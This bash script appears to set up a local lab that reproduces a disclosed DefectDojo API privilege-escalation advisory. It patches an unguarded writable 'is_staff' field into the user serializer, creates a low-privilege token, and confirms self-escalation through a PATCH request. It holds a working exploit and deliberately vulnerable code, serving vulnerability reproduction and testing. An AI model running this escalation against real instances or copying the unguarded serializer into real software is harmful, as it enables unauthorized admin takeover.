#!/usr/bin/env bash
# Stand up a vulnerable DefectDojo instance for GHSA-w2j3-x3j3-mm43 (API
# privilege escalation via is_staff) and CONFIRM the exploit end-to-end using a
# low-privilege, non-staff, non-superuser API token.
#
# The affected release (2.59.0) has no published Docker image, so this runs the
# 2.58.2 image and recreates 2.59.0's vulnerable UserSerializer (adds the
# unguarded "is_staff" writable field) — see the reproduce step below.
#
# Idempotent: `docker compose down -v && ./setup.sh` yields a fresh, working,
# exploitable instance and prints the lowpriv API token + a confirmed escalation.
set -euo pipefail
cd "$(dirname "$0")"

BASE="http://127.0.0.1:8083"
DJ="uwsgi"                       # the Django/uwsgi compose service

ADMIN_USER="admin";   ADMIN_PASS='Admin#12345'
LOW_USER="lowpriv";   LOW_PASS='Lowpriv#12345'

echo "[*] Starting DefectDojo 2.58.2 stack (pinned images from Docker Hub)…"
docker compose up -d

echo "[*] Waiting for the initializer to finish (migrations + fixtures, slow)…"
# The initializer runs once to completion; uwsgi only starts after it succeeds.
for _ in $(seq 1 150); do
  state="$(docker compose ps -a --format '{{.Service}} {{.State}}' 2>/dev/null | awk '$1=="initializer"{print $2}')"
  [ "$state" = "exited" ] && break
  sleep 4
done

echo "[*] Waiting for the API to answer on ${BASE}…"
for _ in $(seq 1 90); do
  code="$(curl -s -o /dev/null -w '%{http_code}' "${BASE}/api/v2/" || true)"
  [ "$code" = "200" ] || [ "$code" = "301" ] || [ "$code" = "401" ] || [ "$code" = "403" ] && break
  sleep 4
done

echo "[*] Reproducing the vulnerable 2.59.0 UserSerializer…"
# GHSA-w2j3-x3j3-mm43 affects DefectDojo 2.59.0, whose api_v2 UserSerializer
# added "is_staff" to its writable fields WITHOUT a superuser guard. 2.59.0 was
# never published as a Docker image (superseded by 3.0.0), and the runnable
# 2.58.2 base does not expose is_staff at all. We therefore recreate the exact
# vulnerable serializer state on 2.58.2 by adding "is_staff" to the field list
# (no guard is added — that guard is the fix). This mirrors the affected code.
docker compose exec -T -u root "$DJ" python3 - <<'PY'
p = "/app/dojo/api_v2/serializers.py"
s = open(p).read()
if '"is_staff"' not in s:
    s = s.replace('            "is_active",\n', '            "is_active",\n            "is_staff",\n', 1)
    open(p, "w").write(s)
    print("  [+] is_staff added to UserSerializer fields (vulnerable state)")
else:
    print("  [=] is_staff already present")
PY
docker compose restart "$DJ" >/dev/null 2>&1
echo "[*] Waiting for the API after reload…"
for _ in $(seq 1 30); do
  code="$(curl -s -o /dev/null -w '%{http_code}' "${BASE}/api/v2/" || true)"
  [ "$code" = "200" ] || [ "$code" = "301" ] || [ "$code" = "401" ] || [ "$code" = "403" ] && break
  sleep 3
done

echo "[*] Provisioning the low-privilege user + API token via manage.py shell…"
# Non-staff, non-superuser user granted ONLY the delegated 'auth.change_user'
# permission (DefectDojo "Configuration -> Users (change)"). Idempotent.
LOW_TOKEN="$(docker compose exec -T "$DJ" ./manage.py shell -c "
from django.contrib.auth import get_user_model
from django.contrib.auth.models import Permission
from rest_framework.authtoken.models import Token

User = get_user_model()
u, _ = User.objects.get_or_create(username='${LOW_USER}', defaults={'first_name':'Low','last_name':'Priv'})
u.set_password('${LOW_PASS}')
u.is_staff = False
u.is_superuser = False
u.is_active = True
u.save()

perm = Permission.objects.get(content_type__app_label='auth', codename='change_user')
u.user_permissions.clear()
u.user_permissions.add(perm)
u.save()

Token.objects.filter(user=u).delete()
tok = Token.objects.create(user=u)
print('LOWTOKEN=' + tok.key)
" 2>/dev/null | sed -n 's/^LOWTOKEN=//p' | tr -d '\r')"

if [ -z "${LOW_TOKEN:-}" ]; then
  echo "[!] Failed to provision the lowpriv token." >&2
  exit 1
fi
echo "[+] lowpriv API token: ${LOW_TOKEN}"

echo
echo "==================== EXPLOIT CONFIRMATION ===================="
echo "[*] Step 1: discover the current (lowpriv) user id from the token…"
PROFILE="$(curl -s -H "Authorization: Token ${LOW_TOKEN}" "${BASE}/api/v2/user_profile/")"
echo "    GET /api/v2/user_profile/  ->  ${PROFILE}"
UID="$(printf '%s' "$PROFILE" | python3 -c 'import sys,json; print(json.load(sys.stdin)["id"])')"
echo "[+] lowpriv user id = ${UID}"

echo
echo "[*] Step 2 (PRE-CHECK): confirm the user is NOT staff yet…"
PRE="$(curl -s -H "Authorization: Token ${LOW_TOKEN}" "${BASE}/api/v2/users/${UID}/")"
echo "    is_staff before = $(printf '%s' "$PRE" | python3 -c 'import sys,json; print(json.load(sys.stdin)["is_staff"])')"

echo
echo "[*] Step 3: PRIVILEGE ESCALATION — PATCH {\"is_staff\": true} as lowpriv…"
RESP="$(curl -s -w $'\n%{http_code}' -X PATCH \
  -H "Authorization: Token ${LOW_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"is_staff": true}' \
  "${BASE}/api/v2/users/${UID}/")"
BODY="$(printf '%s' "$RESP" | sed '$d')"
CODE="$(printf '%s' "$RESP" | tail -n1)"
echo "    HTTP ${CODE}"
echo "    ${BODY}"

echo
NOW_STAFF="$(printf '%s' "$BODY" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("is_staff"))' 2>/dev/null || echo unknown)"
if [ "$CODE" = "200" ] && [ "$NOW_STAFF" = "True" ]; then
  echo "[+] VULNERABLE CONFIRMED: lowpriv escalated itself to is_staff=true (HTTP 200)."
  echo "    -> With is_staff, the account can reach ${BASE}/admin/ and tick is_superuser."
else
  echo "[!] Escalation did NOT succeed (HTTP ${CODE}, is_staff=${NOW_STAFF})."
  echo "    A patched build (>=2.58.3) returns HTTP 400: \"Only superusers are allowed to add or edit staff users\"."
  exit 1
fi
echo "============================================================="
echo
echo "Web UI / API : ${BASE}/   (admin: ${ADMIN_USER} / ${ADMIN_PASS})"
echo "Low-priv     : ${LOW_USER} / ${LOW_PASS}   token: ${LOW_TOKEN}"
